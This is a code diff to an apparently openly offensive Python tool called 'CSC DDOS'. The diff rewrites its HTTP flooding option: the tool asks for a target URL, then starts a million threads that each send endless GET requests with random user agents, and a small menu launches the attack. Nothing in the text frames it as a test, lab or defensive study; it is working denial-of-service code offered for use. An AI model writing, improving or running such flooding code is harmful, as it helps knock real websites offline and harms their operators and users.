@@ -49,7 +49,7 @@ def logo():
 ██╔════╝██╔════╝██╔════╝    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝
 ██║     ███████╗██║         ██║  ██║██║  ██║██║   ██║███████╗
 ██║     ╚════██║██║         ██║  ██║██║  ██║██║   ██║╚════██║
-╚██████╗███████║╚██████╗    ██████╔╝██████╔╝╚██████╔╝███████║ made by mad & online3312
+╚██████╗███████║╚██████╗    ██████╔╝██████╔╝╚██████╔╝███████║ made by mad
  ╚═════╝╚══════╝ ╚═════╝    ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
           """ + TextColors.RESET)
 
@@ -118,25 +118,35 @@ while True:
     # HTTP FLOODING
 
     if select == "3" or select == "HTTP":
-        def flood(url):    
+        def flood(url):
             while True:
                 try:
                     headers = {'User-Agent': random.choice(user_agents)}
                     response = requests.get(url, headers=headers)
-                    print(f"[+] TARGET REQUEST ✅ {url}, : [*] SERVER 🌐 : {response.status_code} ")
+                    print(TextColors.RED + f"[+] TARGET REQUEST ✅ {url}, : [*] SERVER 🌐 : {response.status_code}" + TextColors.RESET)
                 except requests.exceptions.RequestException as e:
                     print(f"Error: {e}")
 
         def start_flooding():
             target_url = input("[+] TARGET URL : ")
-            http_thread = int(input('[+] Threads ✅ : '))
-            print("[+] CSC DDOS HTTP FLOOD")
-            
-            for i in range(http_thread): 
+            print("[+] ATTACK START...")
+    
+            for i in range(1000000):
                 thread = threading.Thread(target=flood, args=(target_url,))
                 thread.start()
 
-        start_flooding()
+    if __name__ == "__main__":
+        while True:
+            print("[1] HTTP FLOODING ")
+            print("[2] Exit ")
+            choice = input("CSC_DDOS:~$ : ")
+            if choice == '1':
+                start_flooding()
+            elif choice == '2':
+                print("Exiting...")
+                break
+            else:
+                print("OPTION FAIL")
 
 
     
